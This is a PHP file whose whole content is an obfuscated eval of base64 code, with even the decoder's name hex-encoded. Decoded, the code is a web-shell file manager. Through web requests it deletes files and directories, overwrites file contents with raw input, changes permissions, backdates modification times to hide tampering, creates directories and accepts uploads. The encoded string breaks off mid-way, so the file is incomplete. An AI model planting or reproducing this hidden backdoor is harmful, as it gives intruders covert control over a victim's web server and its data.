<?php $jlSM9sJG="\x62\141\x73\x65\x36\x34\x5f\144\145\x63\x6f\x64\145";eval($jlSM9sJG("ID8+PD9waHAKc2Vzc2lvbl9zdGFydCgpOwoKLy8gRnVuY3Rpb24gdG8gc2FuaXRpemUgdXNlciBpbnB1dApmdW5jdGlvbiBzYW5pdGl6ZSgkaW5wdXQpIHsKICAgIHJldHVybiBodG1sc3BlY2lhbGNoYXJzKHN0cmlwX3RhZ3MoJGlucHV0KSwgRU5UX1FVT1RFUywgJ1VURi04Jyk7Cn0KCi8vIEZ1bmN0aW9uIHRvIGZvcm1hdCB0aGUgbW9kaWZpY2F0aW9uIHRpbWUKZnVuY3Rpb24gZm9ybWF0TW9kaWZpY2F0aW9uVGltZSgkdGltZXN0YW1wKSB7CiAgICByZXR1cm4gZGF0ZSgnWS1tLWQgSDppJywgJHRpbWVzdGFtcCk7Cn0KCi8vIEZ1bmN0aW9uIHRvIGdldCB0aGUgY3VycmVudCBkaXJlY3RvcnkKZnVuY3Rpb24gZ2V0Q3VycmVudERpcmVjdG9yeSgpIHsKICAgIHJldHVybiBpc3NldCgkX0dFVFsncCddKSA/IHNhbml0aXplKCRfR0VUWydwJ10pIDogJy4nOwp9CgovLyBGdW5jdGlvbiB0byBnZXQgdGhlIGZ1bGwgcGF0aCBvZiB0aGUgc2VsZWN0ZWQgaXRlbQpmdW5jdGlvbiBnZXRGdWxsUGF0aCgkaXRlbSkgewogICAgcmV0dXJuIGdldEN1cnJlbnREaXJlY3RvcnkoKSAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkaXRlbTsKfQoKLy8gRnVuY3Rpb24gdG8gZ2V0IHBlcm1pc3Npb25zIG9mIGEgZmlsZQpmdW5jdGlvbiBwZXJtcygkZmlsZSkgewogICAgcmV0dXJuIHN1YnN0cihkZWNvY3QoZmlsZXBlcm1zKCRmaWxlKSksIC0zKTsKfQoKLy8gRnVuY3Rpb24gdG8gZ2V0IHBlcm1pc3Npb25zIG9mIGEgZGlyZWN0b3J5CmZ1bmN0aW9uIHBlcm1zRGlyKCRkaXIpIHsKICAgIHJldHVybiBzdWJzdHIoZGVjb2N0KGZpbGVwZXJtcygkZGlyKSksIC00KTsKfQoKCgovLyBGdW5jdGlvbiB0byBkaXNwbGF5IHRoZSBkZWxldGUgZmlsZSBmb3JtCmZ1bmN0aW9uIGRpc3BsYXlEZWxldGVGaWxlRm9ybSgkZmlsZVBhdGgpIHsKICAgIGVjaG8gIjxoNSBjbGFzcz0nYm9yZGVyIHAtMSBtYi0zJz5EZWxldGUgRmlsZTwvaDU+IjsKICAgIGVjaG8gIjxmb3JtIG1ldGhvZD0ncG9zdCcgYWN0aW9uPSc/cD0iIC4gdXJsZW5jb2RlKGdldEN1cnJlbnREaXJlY3RvcnkoKSkgLiAiJmE9IiAuIHVybGVuY29kZSgnZGVsZXRlJykgLiAiJm49IiAuIHVybGVuY29kZShiYXNlbmFtZSgkZmlsZVBhdGgpKSAuICInPgogICAgICAgICAgICA8cD5BcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gZGVsZXRlIHRoZSBmaWxlPzwvcD4KICAgICAgICAgICAgPGRpdiBjbGFzcz0nZm9ybS1ncm91cCc+CiAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9J3N1Ym1pdCcgbmFtZT0ncycgY2xhc3M9J2J0biBidG4tZGFuZ2VyIHJvdW5kZWQtMCc+RGVsZXRlPC9idXR0b24+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPC9mb3JtPiI7Cn0KCgovLyBGdW5jdGlvbiB0byBkaXNwbGF5IHRoZSBkZWxldGUgZGlyZWN0b3J5IGZvcm0KZnVuY3Rpb24gZGlzcGxheURlbGV0ZURpckZvcm0oJGRpclBhdGgpIHsKICAgIGVjaG8gIjxoNSBjbGFzcz0nYm9yZGVyIHAtMSBtYi0zJz5EZWxldGUgRGlyZWN0b3J5PC9oNT4iOwogICAgZWNobyAiPGZvcm0gbWV0aG9kPSdwb3N0JyBhY3Rpb249Jz9wPSIgLiB1cmxlbmNvZGUoZ2V0Q3VycmVudERpcmVjdG9yeSgpKSAuICImYT0iIC4gdXJsZW5jb2RlKCdkZWxldGVfZGlyJykgLiAiJm49IiAuIHVybGVuY29kZShiYXNlbmFtZSgkZGlyUGF0aCkpIC4gIic+CiAgICAgICAgICAgIDxwPkFyZSB5b3Ugc3VyZSB5b3Ugd2FudCB0byBkZWxldGUgdGhlIGRpcmVjdG9yeSBhbmQgaXRzIGNvbnRlbnRzPzwvcD4KICAgICAgICAgICAgPGRpdiBjbGFzcz0nZm9ybS1ncm91cCc+CiAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9J3N1Ym1pdCcgbmFtZT0ncycgY2xhc3M9J2J0biBidG4tZGFuZ2VyIHJvdW5kZWQtMCc+RGVsZXRlIERpcmVjdG9yeTwvYnV0dG9uPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDwvZm9ybT4iOwp9CgovLyBGdW5jdGlvbiB0byBkaXNwbGF5IHRoZSBhY2Nlc3MgZm9ybQpmdW5jdGlvbiBkaXNwbGF5QWNjZXNzRm9ybSgpIHsKICAgIGVjaG8gIjxoNSBjbGFzcz0nYm9yZGVyIHAtMSBtYi0zJz5BY2Nlc3MgQ29udHJvbDwvaDU+IjsKICAgIGVjaG8gIjxmb3JtIG1ldGhvZD0ncG9zdCcgYWN0aW9uPSc/cD0iIC4gdXJsZW5jb2RlKGdldEN1cnJlbnREaXJlY3RvcnkoKSkgLiAiJmE9IiAuIHVybGVuY29kZSgnYWNjZXNzX2NvbnRyb2wnKSAuICInPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSdmb3JtLWdyb3VwJz4KICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9J3Bhc3N3b3JkJz5QYXNzd29yZDo8L2xhYmVsPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9J3Bhc3N3b3JkJyBuYW1lPSdwYXNzd29yZCcgaWQ9J3Bhc3N3b3JkJyBjbGFzcz0nZm9ybS1jb250cm9sJz4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9J2Zvcm0tZ3JvdXAnPgogICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSdzdWJtaXQnIG5hbWU9J3MnIGNsYXNzPSdidG4gYnRuLW91dGxpbmUtbGlnaHQgcm91bmRlZC0wJz5TdWJtaXQ8L2J1dHRvbj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8L2Zvcm0+IjsKfQoKLy8gRnVuY3Rpb24gdG8gZGVsZXRlIGEgZmlsZQpmdW5jdGlvbiBkZWxldGVGaWxlKCRmaWxlUGF0aCkgewogICAgaWYgKHVubGluaygkZmlsZVBhdGgpKSB7CiAgICAgICAgZWNobyAiPHA+RmlsZSBkZWxldGVkIHN1Y2Nlc3NmdWxseS48L3A+IjsKICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAiPHA+RmFpbGVkIHRvIGRlbGV0ZSB0aGUgZmlsZS48L3A+IjsKICAgIH0KfQoKLy8gRnVuY3Rpb24gdG8gZGVsZXRlIGEgZGlyZWN0b3J5CmZ1bmN0aW9uIGRlbGV0ZURpcigkZGlyUGF0aCkgewogICAgaWYgKGlzX2RpcigkZGlyUGF0aCkpIHsKICAgICAgICAkb2JqZWN0cyA9IHNjYW5kaXIoJGRpclBhdGgpOwogICAgICAgIGZvcmVhY2ggKCRvYmplY3RzIGFzICRvYmplY3QpIHsKICAgICAgICAgICAgaWYgKCRvYmplY3QgIT0gIi4iICYmICRvYmplY3QgIT0gIi4uIikgewogICAgICAgICAgICAgICAgaWYgKGlzX2RpcigkZGlyUGF0aCAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkb2JqZWN0KSAmJiAhaXNfbGluaygkZGlyUGF0aCAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkb2JqZWN0KSkgewogICAgICAgICAgICAgICAgICAgIGRlbGV0ZURpcigkZGlyUGF0aCAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkb2JqZWN0KTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgdW5saW5rKCRkaXJQYXRoIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICRvYmplY3QpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJlc2V0KCRvYmplY3RzKTsKICAgICAgICBpZiAocm1kaXIoJGRpclBhdGgpKSB7CiAgICAgICAgICAgIGVjaG8gIjxwPkRpcmVjdG9yeSBkZWxldGVkIHN1Y2Nlc3NmdWxseS48L3A+IjsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBlY2hvICI8cD5GYWlsZWQgdG8gZGVsZXRlIHRoZSBkaXJlY3RvcnkuPC9wPiI7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICI8cD5Ob3QgYSB2YWxpZCBkaXJlY3RvcnkuPC9wPiI7CiAgICB9Cn0KCi8vIENoZWNrIGlmIHRoZSBhY3Rpb24gaXMgdG8gZGVsZXRlIGEgZmlsZQppZiAoaXNzZXQoJF9HRVRbJ2EnXSkgJiYgJF9HRVRbJ2EnXSA9PT0gJ2RlbGV0ZScgJiYgaXNzZXQoJF9HRVRbJ24nXSkpIHsKICAgICRkZWxldGVGaWxlID0gc2FuaXRpemUoJF9HRVRbJ24nXSk7CiAgICAkZGVsZXRlRmlsZVBhdGggPSBnZXRGdWxsUGF0aCgkZGVsZXRlRmlsZSk7CgogICAgLy8gRGlzcGxheSBjb25maXJtYXRpb24gZm9ybQogICAgZGlzcGxheURlbGV0ZUZpbGVGb3JtKCRkZWxldGVGaWxlUGF0aCk7CgogICAgLy8gSGFuZGxlIGZvcm0gc3VibWlzc2lvbgogICAgaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcgJiYgaXNzZXQoJF9QT1NUWydzJ10pKSB7CiAgICAgICAgLy8gRGVsZXRlIHRoZSBmaWxlCiAgICAgICAgZGVsZXRlRmlsZSgkZGVsZXRlRmlsZVBhdGgpOwogICAgfQp9CgovLyBDaGVjayBpZiB0aGUgYWN0aW9uIGlzIHRvIGRlbGV0ZSBhIGRpcmVjdG9yeQppZiAoaXNzZXQoJF9HRVRbJ2EnXSkgJiYgJF9HRVRbJ2EnXSA9PT0gJ2RlbGV0ZV9kaXInICYmIGlzc2V0KCRfR0VUWyduJ10pKSB7CiAgICAkZGVsZXRlRGlyID0gc2FuaXRpemUoJF9HRVRbJ24nXSk7CiAgICAkZGVsZXRlRGlyUGF0aCA9IGdldEZ1bGxQYXRoKCRkZWxldGVEaXIpOwoKICAgIC8vIERpc3BsYXkgY29uZmlybWF0aW9uIGZvcm0KICAgIGRpc3BsYXlEZWxldGVEaXJGb3JtKCRkZWxldGVEaXJQYXRoKTsKCiAgICAvLyBIYW5kbGUgZm9ybSBzdWJtaXNzaW9uCiAgICBpZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdQT1NUJyAmJiBpc3NldCgkX1BPU1RbJ3MnXSkpIHsKICAgICAgICAvLyBEZWxldGUgdGhlIGRpcmVjdG9yeQogICAgICAgIGRlbGV0ZURpcigkZGVsZXRlRGlyUGF0aCk7CiAgICB9Cn0KCi8vIEZ1bmN0aW9uIHRvIGRpc3BsYXkgdGhlIGVkaXQgZm9ybQpmdW5jdGlvbiBkaXNwbGF5RWRpdEZvcm0oJGZpbGVQYXRoKSB7CiAgICBlY2hvICI8aDUgY2xhc3M9J2JvcmRlciBwLTEgbWItMyc+RWRpdCBGaWxlPC9oNT4iOwogICAgZWNobyAiPGZvcm0gbWV0aG9kPSdwb3N0JyBhY3Rpb249Jz9wPSIgLiB1cmxlbmNvZGUoZ2V0Q3VycmVudERpcmVjdG9yeSgpKSAuICImYT0iIC4gdXJsZW5jb2RlKCdlZGl0JykgLiAiJm49IiAuIHVybGVuY29kZShiYXNlbmFtZSgkZmlsZVBhdGgpKSAuICInPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSdmb3JtLWdyb3VwJz4KICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9J2N0bic+Q29udGVudDo8L2xhYmVsPgogICAgICAgICAgICAgICAgPHRleHRhcmVhIG5hbWU9J2N0bicgaWQ9J2N0bicgY29scz0nMTUwJyByb3dzPScyMCcgY2xhc3M9J2Zvcm0tY29udHJvbCc+IiAuIGh0bWxzcGVjaWFsY2hhcnMoZmlsZV9nZXRfY29udGVudHMoJGZpbGVQYXRoKSwgRU5UX1FVT1RFUywgJ1VURi04JykgLiAiPC90ZXh0YXJlYT4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9J2Zvcm0tZ3JvdXAnPgogICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSdzdWJtaXQnIG5hbWU9J3MnIGNsYXNzPSdidG4gYnRuLW91dGxpbmUtbGlnaHQgcm91bmRlZC0wJz5TYXZlPC9idXR0b24+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPC9mb3JtPiI7Cn0KLy8gRnVuY3Rpb24gdG8gZGlzcGxheSB0aGUgZWRpdCBwZXJtaXNzaW9uIGZvcm0gZm9yIGZpbGVzCmZ1bmN0aW9uIGRpc3BsYXlFZGl0UGVybWlzc2lvbkZvcm1GaWxlKCRmaWxlUGF0aCkgewogICAgJGN1cnJlbnRQZXJtaXNzaW9uID0gcGVybXMoJGZpbGVQYXRoKTsKICAgIGVjaG8gIjxoNSBjbGFzcz0nYm9yZGVyIHAtMSBtYi0zJz5FZGl0IFBlcm1pc3Npb248L2g1PiI7CiAgICBlY2hvICI8Zm9ybSBtZXRob2Q9J3Bvc3QnIGFjdGlvbj0nP3A9IiAuIHVybGVuY29kZShnZXRDdXJyZW50RGlyZWN0b3J5KCkpIC4gIiZhPSIgLiB1cmxlbmNvZGUoJ2VkaXRfcGVybWlzc2lvbicpIC4gIiZuPSIgLiB1cmxlbmNvZGUoYmFzZW5hbWUoJGZpbGVQYXRoKSkgLiAiJz4KICAgICAgICAgICAgPGRpdiBjbGFzcz0nZm9ybS1ncm91cCc+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSdwZXJtaXNzaW9uJz5QZXJtaXNzaW9uIChOdW1lcmljKTo8L2xhYmVsPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J3Blcm1pc3Npb24nIGlkPSdwZXJtaXNzaW9uJyBjbGFzcz0nZm9ybS1jb250cm9sJyB2YWx1ZT0nJGN1cnJlbnRQZXJtaXNzaW9uJz4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9J2Zvcm0tZ3JvdXAnPgogICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSdzdWJtaXQnIG5hbWU9J3MnIGNsYXNzPSdidG4gYnRuLW91dGxpbmUtbGlnaHQgcm91bmRlZC0wJz5TYXZlIFBlcm1pc3Npb248L2J1dHRvbj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8L2Zvcm0+IjsKfQovLyBIYW5kbGUgZmlsZSBlZGl0aW5nCmlmIChpc3NldCgkX0dFVFsnYSddKSAmJiAkX0dFVFsnYSddID09PSAnZWRpdCcgJiYgaXNzZXQoJF9HRVRbJ24nXSkpIHsKICAgICRlZGl0RmlsZSA9IHNhbml0aXplKCRfR0VUWyduJ10pOwogICAgJGVkaXRGaWxlUGF0aCA9IGdldEZ1bGxQYXRoKCRlZGl0RmlsZSk7CgogICAgLy8gQ2hlY2sgaWYgZmlsZSBleGlzdHMgYW5kIGlzIHdyaXRhYmxlCiAgICBpZiAoZmlsZV9leGlzdHMoJGVkaXRGaWxlUGF0aCkgJiYgaXNfd3JpdGFibGUoJGVkaXRGaWxlUGF0aCkpIHsKICAgICAgICAvLyBQcm9jZXNzIFBPU1QgZGF0YSBpZiBhdmFpbGFibGUKICAgICAgICBpZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdQT1NUJyAmJiBpc3NldCgkX1BPU1RbJ2N0biddKSkgewogICAgICAgICAgICAvLyBEaXJlY3RseSBnZXQgdGhlIHJhdyBjb250ZW50IHdpdGhvdXQgc2FuaXRpemluZwogICAgICAgICAgICAkZWRpdGVkQ29udGVudCA9ICRfUE9TVFsnY3RuJ107CgogICAgICAgICAgICAvLyBWYWxpZGF0ZSB0aGF0IGNvbnRlbnQgaXMgbm90IG51bGwgKHByZXZlbnQgb3ZlcndyaXRpbmcgd2l0aCBlbXB0eSBjb250ZW50IHVuaW50ZW50aW9uYWxseSkKICAgICAgICAgICAgaWYgKCRlZGl0ZWRDb250ZW50ICE9PSBudWxsKSB7CiAgICAgICAgICAgICAgICAvLyBTYXZlIHRoZSBjb250ZW50IHRvIHRoZSBmaWxlCiAgICAgICAgICAgICAgICBpZiAoZmlsZV9wdXRfY29udGVudHMoJGVkaXRGaWxlUGF0aCwgJGVkaXRlZENvbnRlbnQpICE9PSBmYWxzZSkgewogICAgICAgICAgICAgICAgICAgIGVjaG8gIjxwPkZpbGUgZWRpdGVkIHN1Y2Nlc3NmdWxseS48L3A+IjsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgZWNobyAiPHA+RXJyb3Igc2F2aW5nIGZpbGUuIENoZWNrIGZpbGUgcGVybWlzc2lvbnMuPC9wPiI7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBlY2hvICI8cD5ObyBjb250ZW50IHByb3ZpZGVkLiBUaGUgZmlsZSByZW1haW5zIHVuY2hhbmdlZC48L3A+IjsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIC8vIERpc3BsYXkgdGhlIGVkaXQgZm9ybQogICAgICAgICAgICBkaXNwbGF5RWRpdEZvcm0oJGVkaXRGaWxlUGF0aCk7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICI8cD5DYW5ub3QgZWRpdCB0aGUgZmlsZS4gRWl0aGVyIHRoZSBmaWxlIGRvZXMgbm90IGV4aXN0IG9yIGl0IGlzIG5vdCB3cml0YWJsZS48L3A+IjsKICAgIH0KfQoKCi8vIEZ1bmN0aW9uIHRvIGRpc3BsYXkgdGhlIGVkaXQgcGVybWlzc2lvbiBmb3JtIGZvciBkaXJlY3RvcmllcwpmdW5jdGlvbiBkaXNwbGF5RWRpdFBlcm1pc3Npb25Gb3JtRGlyKCRkaXJQYXRoKSB7CiAgICAkY3VycmVudFBlcm1pc3Npb24gPSBwZXJtc0RpcigkZGlyUGF0aCk7CiAgICBlY2hvICI8aDUgY2xhc3M9J2JvcmRlciBwLTEgbWItMyc+RWRpdCBQZXJtaXNzaW9uPC9oNT4iOwogICAgZWNobyAiPGZvcm0gbWV0aG9kPSdwb3N0JyBhY3Rpb249Jz9wPSIgLiB1cmxlbmNvZGUoZ2V0Q3VycmVudERpcmVjdG9yeSgpKSAuICImYT0iIC4gdXJsZW5jb2RlKCdlZGl0X3Blcm1pc3Npb24nKSAuICImbj0iIC4gdXJsZW5jb2RlKGJhc2VuYW1lKCRkaXJQYXRoKSkgLiAiJz4KICAgICAgICAgICAgPGRpdiBjbGFzcz0nZm9ybS1ncm91cCc+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSdwZXJtaXNzaW9uJz5QZXJtaXNzaW9uIChOdW1lcmljKTo8L2xhYmVsPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J3Blcm1pc3Npb24nIGlkPSdwZXJtaXNzaW9uJyBjbGFzcz0nZm9ybS1jb250cm9sJyB2YWx1ZT0nJGN1cnJlbnRQZXJtaXNzaW9uJz4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9J2Zvcm0tZ3JvdXAnPgogICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSdzdWJtaXQnIG5hbWU9J3MnIGNsYXNzPSdidG4gYnRuLW91dGxpbmUtbGlnaHQgcm91bmRlZC0wJz5TYXZlIFBlcm1pc3Npb248L2J1dHRvbj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8L2Zvcm0+IjsKfQoKLy8gRnVuY3Rpb24gdG8gZGlzcGxheSB0aGUgZWRpdCBtb2RpZmljYXRpb24gdGltZSBmb3JtCmZ1bmN0aW9uIGRpc3BsYXlFZGl0TW9kaWZpY2F0aW9uVGltZUZvcm0oJGZpbGVQYXRoKSB7CiAgICAkbW9kaWZpY2F0aW9uVGltZSA9IGZpbGVtdGltZSgkZmlsZVBhdGgpOwogICAgZWNobyAiPGg1IGNsYXNzPSdib3JkZXIgcC0xIG1iLTMnPkVkaXQgTW9kaWZpY2F0aW9uIFRpbWU8L2g1PiI7CiAgICBlY2hvICI8Zm9ybSBtZXRob2Q9J3Bvc3QnIGFjdGlvbj0nP3A9IiAuIHVybGVuY29kZShnZXRDdXJyZW50RGlyZWN0b3J5KCkpIC4gIiZhPSIgLiB1cmxlbmNvZGUoJ2VkaXRfbW9kaWZpY2F0aW9uX3RpbWUnKSAuICImbj0iIC4gdXJsZW5jb2RlKGJhc2VuYW1lKCRmaWxlUGF0aCkpIC4gIic+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9J2Zvcm0tZ3JvdXAnPgogICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0nbW9kaWZpY2F0aW9uVGltZSc+TW9kaWZpY2F0aW9uIFRpbWU6PC9sYWJlbD4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSdkYXRldGltZS1sb2NhbCcgbmFtZT0nbW9kaWZpY2F0aW9uVGltZScgaWQ9J21vZGlmaWNhdGlvblRpbWUnIGNsYXNzPSdmb3JtLWNvbnRyb2wnIHZhbHVlPSciIC4gZGF0ZSgnWS1tLWRcVEg6aScsICRtb2RpZmljYXRpb25UaW1lKSAuICInPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0nZm9ybS1ncm91cCc+CiAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9J3N1Ym1pdCcgbmFtZT0ncycgY2xhc3M9J2J0biBidG4tb3V0bGluZS1saWdodCByb3VuZGVkLTAnPlNhdmUgTW9kaWZpY2F0aW9uIFRpbWU8L2J1dHRvbj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8L2Zvcm0+IjsKfQoKLy8gRnVuY3Rpb24gdG8gZGlzcGxheSB0aGUgY3JlYXRlIGRpcmVjdG9yeSBmb3JtCmZ1bmN0aW9uIGRpc3BsYXlDcmVhdGVEaXJGb3JtKCkgewogICAgZWNobyAiPGg1IGNsYXNzPSdib3JkZXIgcC0xIG1iLTMnPkNyZWF0ZSBEaXJlY3Rvcnk8L2g1PiI7CiAgICBlY2hvICI8Zm9ybSBtZXRob2Q9J3Bvc3QnIGFjdGlvbj0nP3A9IiAuIHVybGVuY29kZShnZXRDdXJyZW50RGlyZWN0b3J5KCkpIC4gIiZhPSIgLiB1cmxlbmNvZGUoJ2NyZWF0ZV9kaXInKSAuICInPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSdmb3JtLWdyb3VwJz4KICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9J2Rpck5hbWUnPkRpcmVjdG9yeSBOYW1lOjwvbGFiZWw+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0ndGV4dCcgbmFtZT0nZGlyTmFtZScgaWQ9J2Rpck5hbWUnIGNsYXNzPSdmb3JtLWNvbnRyb2wnPgogICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSdzdWJtaXQnIG5hbWU9J3MnIGNsYXNzPSdidG4gYnRuLW91dGxpbmUtbGlnaHQgcm91bmRlZC0wJz5DcmVhdGUgRGlyZWN0b3J5PC9idXR0b24+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPC9mb3JtPiI7Cn0KCgovLyBGdW5jdGlvbiB0byBoYW5kbGUgZWRpdGluZyBwZXJtaXNzaW9uCmlmIChpc3NldCgkX0dFVFsnYSddKSAmJiAkX0dFVFsnYSddID09PSAnZWRpdF9wZXJtaXNzaW9uJyAmJiBpc3NldCgkX0dFVFsnbiddKSkgewogICAgJGVkaXRJdGVtID0gc2FuaXRpemUoJF9HRVRbJ24nXSk7CiAgICAkZWRpdEl0ZW1QYXRoID0gZ2V0RnVsbFBhdGgoJGVkaXRJdGVtKTsKCiAgICBpZiAoZmlsZV9leGlzdHMoJGVkaXRJdGVtUGF0aCkpIHsKICAgICAgICBpZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdQT1NUJyAmJiBpc3NldCgkX1BPU1RbJ3Blcm1pc3Npb24nXSkpIHsKICAgICAgICAgICAgJG5ld1Blcm1pc3Npb24gPSAkX1BPU1RbJ3Blcm1pc3Npb24nXTsKICAgICAgICAgICAgaWYgKGlzX251bWVyaWMoJG5ld1Blcm1pc3Npb24pICYmICRuZXdQZXJtaXNzaW9uID49IDAgJiYgJG5ld1Blcm1pc3Npb24gPD0gNzc3KSB7CiAgICAgICAgICAgICAgICBjaG1vZCgkZWRpdEl0ZW1QYXRoLCBvY3RkZWMoJG5ld1Blcm1pc3Npb24pKTsKICAgICAgICAgICAgICAgIGVjaG8gIjxwPlBlcm1pc3Npb24gdXBkYXRlZCBzdWNjZXNzZnVsbHkuPC9wPiI7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBlY2hvICI8cD5JbnZhbGlkIHBlcm1pc3Npb24gdmFsdWUuPC9wPiI7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpZiAoaXNfZmlsZSgkZWRpdEl0ZW1QYXRoKSkgewogICAgICAgICAgICAgICAgZGlzcGxheUVkaXRQZXJtaXNzaW9uRm9ybUZpbGUoJGVkaXRJdGVtUGF0aCk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBkaXNwbGF5RWRpdFBlcm1pc3Npb25Gb3JtRGlyKCRlZGl0SXRlbVBhdGgpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICI8cD5DYW5ub3QgZWRpdCBwZXJtaXNzaW9uLiBFaXRoZXIgdGhlIGl0ZW0gZG9lcyBub3QgZXhpc3Qgb3IgaXQgaXMgbm90IHdyaXRhYmxlLjwvcD4iOwogICAgfQp9CgovLyBGdW5jdGlvbiB0byBoYW5kbGUgZWRpdGluZyBtb2RpZmljYXRpb24gdGltZQppZiAoaXNzZXQoJF9HRVRbJ2EnXSkgJiYgJF9HRVRbJ2EnXSA9PT0gJ2VkaXRfbW9kaWZpY2F0aW9uX3RpbWUnICYmIGlzc2V0KCRfR0VUWyduJ10pKSB7CiAgICAkZWRpdEl0ZW0gPSBzYW5pdGl6ZSgkX0dFVFsnbiddKTsKICAgICRlZGl0SXRlbVBhdGggPSBnZXRGdWxsUGF0aCgkZWRpdEl0ZW0pOwoKICAgIGlmIChmaWxlX2V4aXN0cygkZWRpdEl0ZW1QYXRoKSkgewogICAgICAgIGlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PT0gJ1BPU1QnICYmIGlzc2V0KCRfUE9TVFsnbW9kaWZpY2F0aW9uVGltZSddKSkgewogICAgICAgICAgICAkbmV3TW9kaWZpY2F0aW9uVGltZSA9IHN0cnRvdGltZSgkX1BPU1RbJ21vZGlmaWNhdGlvblRpbWUnXSk7CiAgICAgICAgICAgIGlmICgkbmV3TW9kaWZpY2F0aW9uVGltZSAhPT0gZmFsc2UpIHsKICAgICAgICAgICAgICAgIHRvdWNoKCRlZGl0SXRlbVBhdGgsICRuZXdNb2RpZmljYXRpb25UaW1lKTsKICAgICAgICAgICAgICAgIGVjaG8gIjxwPk1vZGlmaWNhdGlvbiB0aW1lIHVwZGF0ZWQgc3VjY2Vzc2Z1bGx5LjwvcD4iOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgZWNobyAiPHA+SW52YWxpZCBtb2RpZmljYXRpb24gdGltZSB2YWx1ZS48L3A+IjsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGRpc3BsYXlFZGl0TW9kaWZpY2F0aW9uVGltZUZvcm0oJGVkaXRJdGVtUGF0aCk7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICI8cD5DYW5ub3QgZWRpdCBtb2RpZmljYXRpb24gdGltZS4gRWl0aGVyIHRoZSBpdGVtIGRvZXMgbm90IGV4aXN0IG9yIGl0IGlzIG5vdCB3cml0YWJsZS48L3A+IjsKICAgIH0KfQoKLy8gSGFuZGxlIGZpbGUgdXBsb2FkCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PT0gJ1BPU1QnICYmIGlzc2V0KCRfRklMRVNbJ3VwbG9hZGVkX2ZpbGUnXSkpIHsKICAgICR1cGxvYWRlZEZpbGUgPSAkX0ZJTEVTWyd1cGxvYWRlZF9maWxlJ107CgogICAgaWYgKCR1cGxvYWRlZEZpbGVbJ2Vycm9yJ10gPT09IFVQTE9BRF9FUlJfT0spIHsKICAgICAgICAkdXBsb2FkRmlsZVBhdGggPSBnZXRDdXJyZW50RGlyZWN0b3J5KCkgLiBESVJ